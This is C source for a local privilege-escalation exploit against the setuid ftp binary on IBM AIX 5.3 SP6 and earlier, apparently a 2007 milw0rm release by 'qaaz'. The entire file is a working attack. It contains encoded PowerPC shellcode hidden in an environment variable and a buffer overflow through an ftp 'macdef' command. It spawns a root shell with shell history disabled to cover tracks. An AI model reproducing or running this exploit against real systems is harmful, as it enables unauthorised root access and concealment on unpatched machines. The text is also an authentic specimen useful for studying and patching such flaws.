/* 07/2007: public release
 * IBM AIX <= 5.3 sp6
 *
 * AIX ftp Local Root Exploit
 * By qaaz
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>
#include <sys/wait.h>
#include <sys/select.h>

#define TARGET		"/usr/bin/ftp"
#define OVERLEN		300

#define MAX(x,y)	((x) > (y) ? (x) : (y))
#define ALIGN(x,y)	(((x) + (y) - 1) / (y) * (y))

unsigned char qaazcode[] =
"\x60\x60\x60\x60\x60\x60\x60\x60"
"\x7c\x63\x1a\x79\x40\x82\xff\xfd"
"\x7e\xa8\x02\xa6\x3a\xb5\x01\x01"
"\x88\x55\xff\x5b\x3a\xd5\xff\x1b"
"\x7e\xc8\x03\xa6\x4c\xc6\x33\x42"
"\x44\xff\xff\x02\x38\x75\xff\x5f"
"\x38\x63\x01\x01\x88\x95\xff\x5d"
"\x38\x63\x01\x02\x38\x63\xfe\xff"
"\x88\xa3\xfe\xff\x7c\x04\x28\x40"
"\x40\x82\xff\xf0\x7c\xa5\x2a\x78"
"\x98\xa3\xfe\xff\x88\x55\xff\x5c"
"\x38\x75\xff\x5f\x38\x81\xff\xf8"
"\x90\x61\xff\xf8\x90\xa1\xff\xfc"
"\x4b\xff\xff\xbd\xb8\x05\x7c\xff";

void	shell(int p1[2], int p2[2])
{
	ssize_t	n;
	fd_set	rset;
	char	buf[4096];

	for (;;) {
		FD_ZERO(&rset);
		FD_SET(p1[0], &rset);
		FD_SET(p2[0], &rset);

		n = select(MAX(p1[0], p2[0]) + 1,
		           &rset, NULL, NULL, NULL);
		if (n < 0) {
			perror("[-] select");
			break;
		}

		if (FD_ISSET(p1[0], &rset)) {
			n = read(p1[0], buf, sizeof(buf));
			if (n <= 0) break;
			write(p1[1], buf, n);
		}
		if (FD_ISSET(p2[0], &rset)) {
			n = read(p2[0], buf, sizeof(buf));
			if (n <= 0) break;
			write(p2[1], buf, n);
		}
	}
}

/* just because you don't understand it doesn't mean it has to be wrong */
ulong	get_addr(char *argv[], char *envp[], char *args[], char *envs[])
{
	ulong	top, len, off;
	int	i;

	len = 0;
	for (i = 0; argv[i]; i++)
		len += strlen(argv[i]) + 1;
	for (i = 0; envp[i]; i++)
		len += strlen(envp[i]) + 1;
	top = (ulong) argv[0] + ALIGN(len, 8);

	len = off = 0;
	for (i = 0; args[i]; i++)
		len += strlen(args[i]) + 1;
	for (i = 0; envs[i]; i++) {
		if (!strncmp(envs[i], "EGG=", 4))
			off = len + 4;
		len += strlen(envs[i]) + 1;
	}
	while (off & 3)
		strcat(envs[0], "X"), off++, len++;

	return top - ALIGN(len, 4) + off;
}

int	main(int argc, char *argv[], char *envp[])
{
	char	pad[16] = "PAD=X", egg[512];
	char	*args[] = { TARGET, NULL };
	char	*envs[] = { pad, egg, NULL };
	int	pi[2], po[2], i;
	pid_t	child;
	ulong	addr;

	sprintf(egg, "EGG=%s/proc/%d/object/a.out|", qaazcode, getpid());

	if (!envp[0]) {
		setuid(geteuid());
		putenv("HISTFILE=/dev/null");
		execl("/bin/bash", "bash", "-i", NULL);
		execl("/bin/sh", "sh", "-i", NULL);
		perror("[-] execl");
		exit(1);
	}

	printf("----------------------------\n");
	printf(" AIX ftp Local Root Exploit\n");
	printf(" By qaaz\n");
	printf("----------------------------\n");

	if (pipe(pi) < 0 || pipe(po) < 0) {
		perror("[-] pipe");
		exit(1);
	}

	addr = get_addr(argv, envp, args, envs);

	if ((child = fork()) < 0) {
		perror("[-] fork");
		exit(1);
	}

	if (child == 0) {
		dup2(pi[0], 0);
		dup2(po[1], 1);
		dup2(po[1], 2);
		execve(TARGET, args, envs);
		perror("[-] execve");
		exit(1);
	}

	write(pi[1], "macdef foo\n\n$\nfoo ab", 20);
	for (i = 0; i < OVERLEN; i += sizeof(addr))
		write(pi[1], &addr, sizeof(addr));
	write(pi[1], "\n", 1);

	fflush(stdout);
	fflush(stderr);

	close(pi[0]);
	close(po[1]);
	shell((int[2]) { 0, pi[1] }, (int[2]) { po[0], 1 });
	kill(child, SIGTERM);
	waitpid(child, NULL, 0);
	return 0;
}

// milw0rm.com [2007-07-27]